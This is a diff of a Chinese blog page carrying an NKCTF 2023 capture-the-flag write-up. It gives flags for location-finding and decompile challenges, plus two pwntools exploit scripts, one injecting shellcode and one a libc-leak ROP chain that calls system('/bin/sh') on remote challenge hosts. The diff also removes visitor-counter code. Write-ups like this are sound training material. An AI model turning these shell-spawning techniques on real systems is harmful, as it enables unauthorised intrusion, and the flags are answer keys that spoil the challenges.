 <h2 id="旅程的开始"><a href="#旅程的开始" class="headerlink" title="旅程的开始"></a>旅程的开始</h2><p>百度地图搜<code>中铁酒店</code>，得到<code>贵阳火车站</code>，实景一点一点与图片对比</p>
 <p><img src="/img/wp/2023/2023nkctf-43.png" srcset="/img/loading.gif" lazyload></p>
-<p><code>NKCTF&#123;贵州省贵阳市南明区遵义路1号&#125;</code></p>
+<p><code>NKCTF{贵州省贵阳市南明区遵义路1号}</code></p>
 <h2 id="The-other-Bridge"><a href="#The-other-Bridge" class="headerlink" title="The other Bridge"></a>The other Bridge</h2><p>百度识图，得到<code>戴家巷崖壁步道</code></p>
 <p><img src="/img/wp/2023/2023nkctf-44.png" srcset="/img/loading.gif" lazyload></p>
 <p>根据提示加个<code>畔</code></p>
-<p><code>NKCTF&#123;重庆市江北区嘉陵江畔戴家巷崖壁步道&#125;</code></p>
+<p><code>NKCTF{重庆市江北区嘉陵江畔戴家巷崖壁步道}</code></p>
 <h2 id="decompile"><a href="#decompile" class="headerlink" title="decompile"></a>decompile</h2><p>步骤与上面的<code>decompile_revenge</code>一样</p>
-<p><code>NKCTF&#123;N0w_you_kn0w_d3compl1te_bytecode&#125;</code></p>
+<p><code>NKCTF{N0w_you_kn0w_d3compl1te_bytecode}</code></p>
 <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node.yuzhian.com.cn:32220&quot;</span>)<br>shell=asm(shellcraft.sh()).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;min!&#x27;</span>,shell)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 <h2 id="a-story-of-a-pwner"><a href="#a-story-of-a-pwner" class="headerlink" title="a_story_of_a_pwner"></a>a_story_of_a_pwner</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node.yuzhian.com.cn:36024&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;see this. &#x27;</span>)<br><br>d=<span class="hljs-built_in">int</span>(p.readline().decode().strip(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>rdi=libc.address+<span class="hljs-number">0x0019764d</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;comment?&#x27;</span>,p64(bin_sh))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corment?&#x27;</span>,p64(rdi))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corMenT?&#x27;</span>,p64(system))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa</span>+p64(<span class="hljs-number">0x405098</span>)+p64(<span class="hljs-number">0x401502</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
@@ -961,23 +952,6 @@
   
 
   
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
 
 </div>
 
@@ -1145,8 +1119,6 @@
 
 
   <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
 
   <script  src="/js/local-search.js" ></script>
 
